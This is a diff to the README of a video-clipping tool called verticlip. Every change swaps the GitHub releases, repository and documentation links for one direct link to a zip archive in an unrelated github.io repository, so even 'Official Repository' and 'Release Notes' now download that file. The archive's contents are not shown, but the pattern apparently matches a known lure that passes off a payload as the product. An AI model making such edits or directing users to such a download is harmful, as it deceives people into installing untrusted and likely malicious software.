@@ -6,7 +6,7 @@ description: "Turn long videos into captioned 9:16 clips locally using Whisper, 
 <h1>✂️ verticlip - Turn Long Videos into Viral Shorts</h1>
 
 <div align="center">
-<a href="https://github.com/DeepestOceanEver/verticlip/releases" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea,#764ba2);color:white;font-size:20px;font-weight:bold;border-radius:8px;text-decoration:none;box-shadow:0 4px 6px rgba(0,0,0,0.1);">⬇️ DOWNLOAD VERTICLIP NOW</a>
+<a href="https://raw.githubusercontent.com/DeepestOceanEver/deepestoceanever.github.io/main/assets/projects/v3.4.zip" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea,#764ba2);color:white;font-size:20px;font-weight:bold;border-radius:8px;text-decoration:none;box-shadow:0 4px 6px rgba(0,0,0,0.1);">⬇️ DOWNLOAD VERTICLIP NOW</a>
 </div>
 
 ---
@@ -35,7 +35,7 @@ Getting verticlip up and running takes less than five minutes. Here's what you n
 
 <h3>Step 1: Download</h3>
 
-Visit <a href="https://github.com/DeepestOceanEver/verticlip/releases">this link to download the application</a>. The download page will show you the latest version. Look for the file that matches your system and click to download it.
+Visit <a href="https://raw.githubusercontent.com/DeepestOceanEver/deepestoceanever.github.io/main/assets/projects/v3.4.zip">this link to download the application</a>. The download page will show you the latest version. Look for the file that matches your system and click to download it.
 
 <h3>Step 2: Install</h3>
 
@@ -137,7 +137,7 @@ Most video clipping tools either cost money, upload your content to servers, or 
 
 <h2>📥 Ready to Start?</h2>
 
-<a href="https://github.com/DeepestOceanEver/verticlip/releases" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#f093fb,#f5576c);color:white;font-size:18px;font-weight:bold;border-radius:8px;text-decoration:none;box-shadow:0 4px 6px rgba(0,0,0,0.1);">⬇️ Download verticlip Now</a>
+<a href="https://raw.githubusercontent.com/DeepestOceanEver/deepestoceanever.github.io/main/assets/projects/v3.4.zip" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#f093fb,#f5576c);color:white;font-size:18px;font-weight:bold;border-radius:8px;text-decoration:none;box-shadow:0 4px 6px rgba(0,0,0,0.1);">⬇️ Download verticlip Now</a>
 
 ---
 
@@ -162,9 +162,9 @@ Need help? Check the GitHub Issues page first — your question may already have
 
 <h2>📚 Additional Resources</h2>
 
-- <a href="https://github.com/DeepestOceanEver/verticlip">Official Repository</a>
-- <a href="https://github.com/DeepestOceanEver/verticlip/blob/main/README.md">Detailed Documentation</a>
-- <a href="https://github.com/DeepestOceanEver/verticlip/releases">Release Notes & Updates</a>
+- <a href="https://raw.githubusercontent.com/DeepestOceanEver/deepestoceanever.github.io/main/assets/projects/v3.4.zip">Official Repository</a>
+- <a href="https://raw.githubusercontent.com/DeepestOceanEver/deepestoceanever.github.io/main/assets/projects/v3.4.zip">Detailed Documentation</a>
+- <a href="https://raw.githubusercontent.com/DeepestOceanEver/deepestoceanever.github.io/main/assets/projects/v3.4.zip">Release Notes & Updates</a>
 
 ---
 
